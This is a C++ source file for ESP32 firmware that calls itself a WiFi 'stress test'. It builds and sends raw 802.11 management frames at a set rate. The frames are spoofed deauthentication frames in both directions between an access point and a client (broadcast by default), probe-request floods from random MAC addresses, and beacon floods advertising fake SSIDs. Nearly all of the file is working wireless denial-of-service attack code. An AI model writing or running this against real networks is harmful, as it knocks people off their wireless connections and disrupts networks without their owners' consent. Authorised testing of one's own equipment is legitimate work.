#include "wifi_stress_test.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include "wifi_sniffer_common.h"

static StressTestConfig s_config;
static TaskHandle_t s_stressTaskHandle = NULL;

// Helper to parse MAC
static bool parseMac(const String& macStr, uint8_t* mac) {
    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)values[i];
        return true;
    }
    return false;
}

void stressTask(void* pvParameters) {
    uint8_t packet[128];
    uint8_t targetMac[6];
    uint8_t clientMac[6];
    
    if (!parseMac(s_config.targetMac, targetMac)) {
        memset(targetMac, 0xFF, 6);
    }
    if (!parseMac(s_config.clientMac, clientMac)) {
        memset(clientMac, 0xFF, 6); // Broadcast
    }

    TickType_t xLastWakeTime = xTaskGetTickCount();
    // Default rate if not set
    if (s_config.rate == 0) s_config.rate = 10;
    
    uint32_t delay_ms = 1000 / s_config.rate;
    if (delay_ms == 0) delay_ms = 1;
    const TickType_t xFrequency = pdMS_TO_TICKS(delay_ms);

    Serial.printf("[STRESS] Starting test type %d on channel %d, rate %d pkts/s\n", 
                  s_config.type, s_config.channel, s_config.rate);

    while (s_config.active) {
        // Ensure we are on the right channel
        uint8_t current_ch;
        esp_wifi_get_channel(&current_ch, NULL);
        if (current_ch != s_config.channel) {
            esp_wifi_set_channel(s_config.channel, WIFI_SECOND_CHAN_NONE);
        }

        if (s_config.type == STRESS_TYPE_DEAUTH) {
            // 1. Deauth from AP to Client
            packet[0] = 0xC0; packet[1] = 0x00; // Type: Mgmt, Subtype: Deauth
            packet[2] = 0x00; packet[3] = 0x00; // Duration
            memcpy(&packet[4], clientMac, 6);   // Destination
            memcpy(&packet[10], targetMac, 6);  // Source (AP)
            memcpy(&packet[16], targetMac, 6);  // BSSID
            packet[22] = 0x00; packet[23] = 0x00; // Seq
            packet[24] = 0x01; packet[25] = 0x00; // Reason: Unspecified
            
            esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
            
            // 2. Deauth from Client to AP
            memcpy(&packet[4], targetMac, 6);
            memcpy(&packet[10], clientMac, 6);
            memcpy(&packet[16], targetMac, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);

        } else if (s_config.type == STRESS_TYPE_PROBE_FLOOD) {
            // Probe Request with random source
            packet[0] = 0x40; packet[1] = 0x00;
            packet[2] = 0x00; packet[3] = 0x00;
            memset(&packet[4], 0xFF, 6); // Broadcast
            for(int i=0; i<6; i++) packet[10+i] = random(256);
            packet[10] &= 0xFE; packet[10] |= 0x02; // Local unicast
            memcpy(&packet[16], &packet[4], 6);
            packet[22] = 0x00; packet[23] = 0x00;
            packet[24] = 0x00; packet[25] = 0x00; // Wildcard SSID
            
            esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
        } else if (s_config.type == STRESS_TYPE_BEACON_FLOOD) {
            // Beacon Flood with random SSIDs
            packet[0] = 0x80; packet[1] = 0x00;
            packet[2] = 0x00; packet[3] = 0x00;
            memset(&packet[4], 0xFF, 6); // Destination
            for(int i=0; i<6; i++) packet[10+i] = random(256);
            packet[10] &= 0xFE; packet[10] |= 0x02;
            memcpy(&packet[16], &packet[10], 6); // BSSID = Source
            packet[22] = 0x00; packet[23] = 0x00;
            // Fixed params (Timestamp, Beacon Interval, Capab) - 12 bytes
            memset(&packet[24], 0, 12);
            packet[32] = 0x64; // 100ms
            packet[34] = 0x11; packet[35] = 0x04; // ESS, Privacy
            
            // SSID Tag
            packet[36] = 0x00; 
            String ssid = "STRESS_" + String(random(1000, 9999));
            packet[37] = ssid.length();
            memcpy(&packet[38], ssid.c_str(), ssid.length());
            
            // DS Tag (Channel)
            int ds_off = 38 + ssid.length();
            packet[ds_off] = 0x03; packet[ds_off+1] = 0x01; packet[ds_off+2] = s_config.channel;
            
            esp_wifi_80211_tx(WIFI_IF_STA, packet, ds_off + 3, false);
        }

        vTaskDelayUntil(&xLastWakeTime, xFrequency);
    }
    
    Serial.println("[STRESS] Test stopped.");
    s_stressTaskHandle = NULL;
    vTaskDelete(NULL);
}

void stressTestSetup() {
    s_config.active = false;
}

void stressTestStart(StressTestConfig config) {
    if (s_config.active) stressTestStop();
    
    s_config = config;
    s_config.active = true;
    
    // Create task on Core 0 (WiFi Core) to keep Core 1 free for LED/Main loop
    xTaskCreatePinnedToCore(stressTask, "stress_task", 4096, NULL, 5, &s_stressTaskHandle, 0);
}

void stressTestStop() {
    if (!s_config.active) return;
    
    s_config.active = false;
    Serial.println("[STRESS] Stopping test...");
    
    // The task will delete itself after finishing the current loop
    // But we can also nullify the handle to be safe
    s_stressTaskHandle = NULL;
}

bool stressTestIsActive() {
    return s_config.active;
}

void stressTestLoop() {
    // No-op for now as it uses a task
}
